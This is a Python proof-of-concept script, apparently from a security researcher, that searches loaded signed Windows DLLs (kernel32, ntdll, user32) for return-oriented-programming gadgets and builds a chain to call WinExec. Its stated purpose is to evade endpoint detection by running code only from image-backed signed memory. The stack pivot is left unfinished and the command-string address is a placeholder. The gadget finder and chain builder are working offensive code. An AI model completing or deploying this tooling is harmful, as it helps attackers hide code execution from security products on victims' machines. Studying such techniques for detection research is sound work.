#!/usr/bin/env python3
"""
OIS-ROP: Offset Instruction Set - Return Oriented Programming
=============================================================

Instead of copying bytes from signed DLLs to private memory,
we execute DIRECTLY within the already-loaded signed DLL's image.

No VirtualAlloc. No Private memory. No RW→RX transitions.
Just jumping to addresses within legitimately loaded, Image-backed,
signed Microsoft code.

The "payload" is a sequence of addresses within kernel32/ntdll.
The execution happens in Image memory that's already trusted.

Author: Chris Aziz / Bombadil Systems
"""

import ctypes
import ctypes.wintypes as wintypes
import struct
import sys
from typing import Dict, List, Tuple, Optional
from dataclasses import dataclass


# =============================================================================
# GADGET FINDING
# =============================================================================

@dataclass
class Gadget:
    """A useful instruction sequence within a loaded module."""
    address: int
    bytes: bytes
    disasm: str
    module: str
    offset: int  # Offset from module base


class GadgetFinder:
    """
    Finds useful instruction sequences within loaded signed modules.
    These are already in Image-backed memory - no copying needed.
    """
    
    def __init__(self):
        self.modules: Dict[str, Tuple[int, int, bytes]] = {}  # name -> (base, size, bytes)
        self._load_modules()
    
    def _load_modules(self):
        """Get base addresses and contents of loaded modules."""
        
        try:
            kernel32 = ctypes.windll.kernel32
            
            # === FIX: Define return types for 64-bit pointers ===
            kernel32.GetModuleHandleW.restype = ctypes.c_void_p
            kernel32.LoadLibraryW.restype = ctypes.c_void_p
            kernel32.GetProcAddress.restype = ctypes.c_void_p
            # === END FIX ===
            
            # Get module handles
            print("  Getting kernel32 handle...")
            h_kernel32 = kernel32.GetModuleHandleW("kernel32.dll")
            print(f"    kernel32 handle: 0x{h_kernel32:X}" if h_kernel32 else "    kernel32: None")
            
            print("  Getting ntdll handle...")
            h_ntdll = kernel32.GetModuleHandleW("ntdll.dll")
            print(f"    ntdll handle: 0x{h_ntdll:X}" if h_ntdll else "    ntdll: None")
            
            # Try to load user32 if not loaded
            h_user32 = None
            try:
                print("  Loading user32...")
                h_user32 = kernel32.LoadLibraryW("user32.dll")
                print(f"    user32 handle: 0x{h_user32:X}" if h_user32 else "    user32: None")
            except Exception as e:
                print(f"    user32 load failed: {e}")
            
            # Get module info
            print("  Mapping modules...")
            self._map_module("kernel32", h_kernel32)
            self._map_module("ntdll", h_ntdll)
            if h_user32:
                self._map_module("user32", h_user32)
                
        except Exception as e:
            print(f"  ERROR in _load_modules: {e}")
            import traceback
            traceback.print_exc()
    
    def _map_module(self, name: str, handle: int):
        """Map a module's memory for gadget searching."""
        if not handle:
            print(f"    Skipping {name}: no handle")
            return
        
        try:
            print(f"    Reading {name} PE header...")
            
            # Read DOS header - just need e_lfanew at offset 0x3C
            dos_e_lfanew = ctypes.c_uint32.from_address(handle + 0x3C).value
            print(f"      e_lfanew: 0x{dos_e_lfanew:X}")
            
            # PE signature is at handle + e_lfanew
            pe_sig_addr = handle + dos_e_lfanew
            
            # Optional header starts at PE + 24 (after 4-byte sig + 20-byte COFF header)
            opt_header_addr = pe_sig_addr + 24
            
            # Check if PE32 or PE32+ (magic is first 2 bytes of optional header)
            magic = ctypes.c_uint16.from_address(opt_header_addr).value
            is_64bit = magic == 0x20b
            print(f"      Magic: 0x{magic:X} ({'PE32+' if is_64bit else 'PE32'})")
            
            # SizeOfImage is at offset 56 from start of optional header
            size_of_image = ctypes.c_uint32.from_address(opt_header_addr + 56).value
            
            print(f"      SizeOfImage: 0x{size_of_image:X} ({size_of_image:,} bytes)")
            
            # Instead of reading all bytes at once (which can crash),
            # let's just store the base and size for now
            # We'll read bytes on-demand during gadget search
            
            self.modules[name] = (handle, size_of_image, None)  # None = read on demand
            print(f"    Mapped {name}: base=0x{handle:X}, size={size_of_image:,}")
            
        except Exception as e:
            print(f"    Failed to map {name}: {e}")
            import traceback
            traceback.print_exc()
    
    def find_gadget(self, pattern: bytes, module: str = None) -> List[Gadget]:
        """Find all occurrences of a byte pattern in loaded modules."""
        results = []
        
        modules_to_search = [module] if module else list(self.modules.keys())
        
        for mod_name in modules_to_search:
            if mod_name not in self.modules:
                continue
            
            base, size, cached_data = self.modules[mod_name]
            
            # Read module bytes if not cached
            if cached_data is None:
                try:
                    # Read in chunks to avoid issues with large reads
                    # For gadget finding, we mainly care about executable sections
                    # Let's read a reasonable amount (first 2MB should cover code)
                    read_size = min(size, 2 * 1024 * 1024)
                    data = (ctypes.c_ubyte * read_size).from_address(base)
                    data = bytes(data)
                except Exception as e:
                    print(f"    Error reading {mod_name}: {e}")
                    continue
            else:
                data = cached_data
            
            # Search for pattern
            offset = 0
            while True:
                idx = data.find(pattern, offset)
                if idx == -1:
                    break
                
                results.append(Gadget(
                    address=base + idx,
                    bytes=pattern,
                    disasm="",  # Would need disassembler
                    module=mod_name,
                    offset=idx
                ))
                offset = idx + 1
        
        return results
    
    def find_ret_gadgets(self, module: str = None) -> List[Gadget]:
        """Find all RET instructions (0xC3)."""
        return self.find_gadget(b'\xC3', module)
    
    def find_syscall_gadgets(self, module: str = "ntdll") -> List[Gadget]:
        """Find syscall; ret sequences."""
        # syscall = 0x0F 0x05, ret = 0xC3
        return self.find_gadget(b'\x0F\x05\xC3', module)
    
    def find_pop_ret_gadgets(self, module: str = None) -> Dict[str, List[Gadget]]:
        """Find pop reg; ret gadgets for setting up registers."""
        gadgets = {}
        
        # pop rax; ret
        gadgets['pop_rax'] = self.find_gadget(b'\x58\xC3', module)
        # pop rcx; ret
        gadgets['pop_rcx'] = self.find_gadget(b'\x59\xC3', module)
        # pop rdx; ret  
        gadgets['pop_rdx'] = self.find_gadget(b'\x5A\xC3', module)
        # pop rbx; ret
        gadgets['pop_rbx'] = self.find_gadget(b'\x5B\xC3', module)
        # pop rsi; ret
        gadgets['pop_rsi'] = self.find_gadget(b'\x5E\xC3', module)
        # pop rdi; ret
        gadgets['pop_rdi'] = self.find_gadget(b'\x5F\xC3', module)
        # pop r8; ret (41 58 C3)
        gadgets['pop_r8'] = self.find_gadget(b'\x41\x58\xC3', module)
        # pop r9; ret (41 59 C3)
        gadgets['pop_r9'] = self.find_gadget(b'\x41\x59\xC3', module)
        
        return gadgets
    
    def find_mov_gadgets(self, module: str = None) -> Dict[str, List[Gadget]]:
        """Find useful mov gadgets."""
        gadgets = {}
        
        # mov rax, rcx; ret
        gadgets['mov_rax_rcx'] = self.find_gadget(b'\x48\x89\xC8\xC3', module)
        # xor rax, rax; ret
        gadgets['xor_rax_rax'] = self.find_gadget(b'\x48\x31\xC0\xC3', module)
        # xor rcx, rcx; ret
        gadgets['xor_rcx_rcx'] = self.find_gadget(b'\x48\x31\xC9\xC3', module)
        
        return gadgets
    
    def find_call_gadgets(self, module: str = None) -> Dict[str, List[Gadget]]:
        """Find call reg gadgets."""
        gadgets = {}
        
        # jmp rax
        gadgets['jmp_rax'] = self.find_gadget(b'\xFF\xE0', module)
        # call rax
        gadgets['call_rax'] = self.find_gadget(b'\xFF\xD0', module)
        
        return gadgets
    
    def get_function_address(self, module: str, function: str) -> int:
        """Get the address of an exported function."""
        kernel32 = ctypes.windll.kernel32
        
        # Set proper argument and return types for 64-bit
        kernel32.GetModuleHandleW.restype = ctypes.c_void_p
        kernel32.LoadLibraryW.restype = ctypes.c_void_p
        kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
        kernel32.GetProcAddress.restype = ctypes.c_void_p
        
        h_module = kernel32.GetModuleHandleW(f"{module}.dll")
        if not h_module:
            h_module = kernel32.LoadLibraryW(f"{module}.dll")
        
        addr = kernel32.GetProcAddress(h_module, function.encode())
        return addr


# =============================================================================
# ROP CHAIN BUILDER  
# =============================================================================

class ROPChain:
    """Builds a ROP chain from gadgets within signed modules."""
    
    def __init__(self, finder: GadgetFinder):
        self.finder = finder
        self.chain: List[int] = []
        self.gadgets = {}
        
    def _ensure_gadgets(self):
        """Cache commonly needed gadgets."""
        if self.gadgets:
            return
        
        print("\n[*] Searching for gadgets in loaded modules...")
        
        self.gadgets['pop_ret'] = self.finder.find_pop_ret_gadgets()
        self.gadgets['mov'] = self.finder.find_mov_gadgets()
        self.gadgets['call'] = self.finder.find_call_gadgets()
        
        # Report what we found
        for category, gads in self.gadgets.items():
            if isinstance(gads, dict):
                for name, found in gads.items():
                    if found:
                        print(f"    {name}: {len(found)} found (first @ 0x{found[0].address:X})")
            else:
                print(f"    {category}: {len(gads)} found")
    
    def add_raw(self, value: int):
        """Add a raw value to the chain (address or data)."""
        self.chain.append(value)
        return self
    
    def add_gadget(self, gadget: Gadget):
        """Add a gadget to the chain."""
        self.chain.append(gadget.address)
        return self
    
    def pop_rcx(self, value: int):
        """Set RCX to a value using pop rcx; ret."""
        self._ensure_gadgets()
        
        pops = self.gadgets['pop_ret'].get('pop_rcx', [])
        if not pops:
            raise ValueError("No pop rcx; ret gadget found")
        
        self.chain.append(pops[0].address)  # pop rcx; ret
        self.chain.append(value)             # value to pop into rcx
        return self
    
    def pop_rdx(self, value: int):
        """Set RDX to a value using pop rdx; ret."""
        self._ensure_gadgets()
        
        pops = self.gadgets['pop_ret'].get('pop_rdx', [])
        if not pops:
            raise ValueError("No pop rdx; ret gadget found")
        
        self.chain.append(pops[0].address)
        self.chain.append(value)
        return self
    
    def pop_r8(self, value: int):
        """Set R8 to a value."""
        self._ensure_gadgets()
        
        pops = self.gadgets['pop_ret'].get('pop_r8', [])
        if not pops:
            raise ValueError("No pop r8; ret gadget found")
        
        self.chain.append(pops[0].address)
        self.chain.append(value)
        return self
    
    def pop_r9(self, value: int):
        """Set R9 to a value."""
        self._ensure_gadgets()
        
        pops = self.gadgets['pop_ret'].get('pop_r9', [])
        if not pops:
            raise ValueError("No pop r9; ret gadget found")
        
        self.chain.append(pops[0].address)
        self.chain.append(value)
        return self
    
    def call_function(self, func_addr: int):
        """Call a function (must have set up args first)."""
        # For x64, we need to be careful about stack alignment
        # and shadow space. This is simplified.
        self.chain.append(func_addr)
        return self
    
    def build(self) -> bytes:
        """Build the chain as bytes for stack placement."""
        return b''.join(struct.pack('<Q', addr) for addr in self.chain)
    
    def dump(self):
        """Print the chain for debugging."""
        print("\nROP Chain:")
        print("-" * 50)
        for i, addr in enumerate(self.chain):
            print(f"  [{i:2d}] 0x{addr:016X}")


# =============================================================================
# EXECUTION ENGINE
# =============================================================================

class ImageBackedExecutor:
    """
    Executes code using only addresses within Image-backed memory.
    No Private memory allocations for code.
    """
    
    def __init__(self):
        self.finder = GadgetFinder()
    
    def execute_rop_chain(self, chain: ROPChain) -> int:
        """
        Execute a ROP chain by pivoting the stack.
        
        This is the tricky part - we need to get RSP pointing to our chain.
        Options:
        1. Overwrite a return address (buffer overflow - not applicable)
        2. Use SetThreadContext to set RSP
        3. Use a stack pivot gadget
        4. Use NtContinue with a crafted CONTEXT
        """
        
        chain_bytes = chain.build()
        
        print(f"\n[*] Chain built: {len(chain_bytes)} bytes ({len(chain.chain)} entries)")
        chain.dump()
        
        # We still need SOME memory for the chain data itself
        # But this is DATA, not CODE - it's not executed directly
        # The code being executed is within the signed modules
        
        kernel32 = ctypes.windll.kernel32
        
        # Allocate RW (not RWX!) memory for the chain
        MEM_COMMIT = 0x1000
        MEM_RESERVE = 0x2000
        PAGE_READWRITE = 0x04
        
        kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
        kernel32.VirtualAlloc.restype = ctypes.c_void_p
        
        chain_addr = kernel32.VirtualAlloc(
            None,
            len(chain_bytes) + 0x1000,  # Extra space
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE  # Just RW - not executable!
        )
        
        if not chain_addr:
            raise RuntimeError("Failed to allocate chain memory")
        
        print(f"[*] Chain data at: 0x{chain_addr:X} (RW, not executable)")
        
        # Copy chain to memory
        ctypes.memmove(chain_addr, chain_bytes, len(chain_bytes))
        
        # Now we need to pivot RSP to chain_addr and start the chain
        # This is where it gets architecture-specific
        
        # One approach: Create a thread with the first gadget as entry,
        # and manipulate the stack pointer
        
        # For demonstration, let's use a simpler approach:
        # Find a "pivot" gadget that does: xchg rax, rsp; ret
        # or: mov rsp, rax; ret
        # Then we can set RAX to our chain address
        
        print("\n[*] Searching for stack pivot gadgets...")
        
        # xchg eax, esp; ret (common in 32-bit, rare in 64-bit)
        # push rax; ... ; ret sequences
        # leave; ret (mov rsp, rbp; pop rbp; ret)
        
        pivots = self.finder.find_gadget(b'\x94\xC3')  # xchg eax, esp; ret
        if pivots:
            print(f"    Found xchg eax, esp; ret at 0x{pivots[0].address:X}")
        
        # For now, demonstrate the concept with a simple approach
        print("\n[!] Full ROP execution requires stack pivot - demonstrating gadget chain concept")
        
        return 0


# =============================================================================
# DEMONSTRATION
# =============================================================================

def demo_gadget_finding():
    """Demonstrate finding gadgets in signed modules."""
    
    print("=" * 70)
    print("OIS-ROP: Finding Gadgets in Signed Modules")
    print("=" * 70)
    print()
    print("All gadgets are within Image-backed memory.")
    print("No Private memory. No RW→RX. Just addresses in signed DLLs.")
    print()
    
    print("[1] Mapping loaded modules...")
    finder = GadgetFinder()
    
    print(f"\n[2] Finding gadgets...")
    
    # Find various gadgets
    pop_ret = finder.find_pop_ret_gadgets("kernel32")
    
    print(f"\n[3] Pop/Ret gadgets found in kernel32:")
    for name, gadgets in pop_ret.items():
        if gadgets:
            g = gadgets[0]
            print(f"    {name}: 0x{g.address:X} (offset 0x{g.offset:X})")
    
    # Find call gadgets
    call_gads = finder.find_call_gadgets("kernel32")
    print(f"\n[4] Call gadgets found:")
    for name, gadgets in call_gads.items():
        if gadgets:
            g = gadgets[0]
            print(f"    {name}: 0x{g.address:X} (offset 0x{g.offset:X})")
    
    # Find syscall gadgets in ntdll
    syscalls = finder.find_syscall_gadgets("ntdll")
    print(f"\n[5] Syscall gadgets in ntdll: {len(syscalls)} found")
    if syscalls:
        for g in syscalls[:3]:
            print(f"    0x{g.address:X} (offset 0x{g.offset:X})")
    
    # Get WinExec address
    winexec = finder.get_function_address("kernel32", "WinExec")
    print(f"\n[6] WinExec address: 0x{winexec:X}")
    
    # Build a conceptual ROP chain for WinExec("calc", 1)
    print(f"\n[7] Building conceptual ROP chain for WinExec('calc', 1)...")
    
    chain = ROPChain(finder)
    
    # In x64 Windows calling convention:
    # RCX = first arg (lpCmdLine)
    # RDX = second arg (uCmdShow)
    # Then call function
    
    # We'd need:
    # 1. Get address of "calc" string somewhere (or build it)
    # 2. pop rcx; ret -> address of "calc"
    # 3. pop rdx; ret -> 1 (SW_SHOWNORMAL)
    # 4. Address of WinExec
    
    # For demo, use a dummy address for "calc" string
    calc_string_addr = 0x4141414141414141  # Would be real address
    
    try:
        chain.pop_rcx(calc_string_addr)  # RCX = "calc"
        chain.pop_rdx(1)                  # RDX = SW_SHOWNORMAL
        chain.call_function(winexec)      # Call WinExec
        
        chain.dump()
        
        print("\n[*] Chain addresses are ALL within signed kernel32.dll")
        print("[*] No code in Private memory - only DATA (the chain itself)")
        print("[*] Execution happens in Image-backed memory")
        
    except ValueError as e:
        print(f"\n[!] Could not build complete chain: {e}")
        print("[*] Some gadgets not found - would need deeper search")
    
    return finder, chain


def demo_execution():
    """Demonstrate actual execution concept."""
    
    print("\n" + "=" * 70)
    print("OIS-ROP: Execution Concept")
    print("=" * 70)
    
    finder = GadgetFinder()
    executor = ImageBackedExecutor()
    
    # Build a minimal chain
    chain = ROPChain(finder)
    
    # For actual execution, we need to solve stack pivoting
    # This is left as the next step
    
    print("""
The key insight:

TRADITIONAL:
  [Private RWX Memory] contains [Shellcode]
  EDR sees: "Private executable memory - suspicious!"

OIS-ROP:
  [Image Memory (kernel32)] contains [Code we jump to]
  [Private RW Memory] contains [Chain of addresses - just data]
  EDR sees: "Execution in kernel32 image... normal?"

The code being executed is WITHIN kernel32's image.
We're just controlling WHICH parts execute and in WHAT ORDER.

To complete this:
1. Find a stack pivot gadget
2. Place our chain in RW memory (data, not code)
3. Pivot RSP to our chain
4. RET starts executing through Image-backed gadgets

The 'shellcode' never exists. Only addresses into signed code.
""")


if __name__ == "__main__":
    finder, chain = demo_gadget_finding()
    demo_execution()
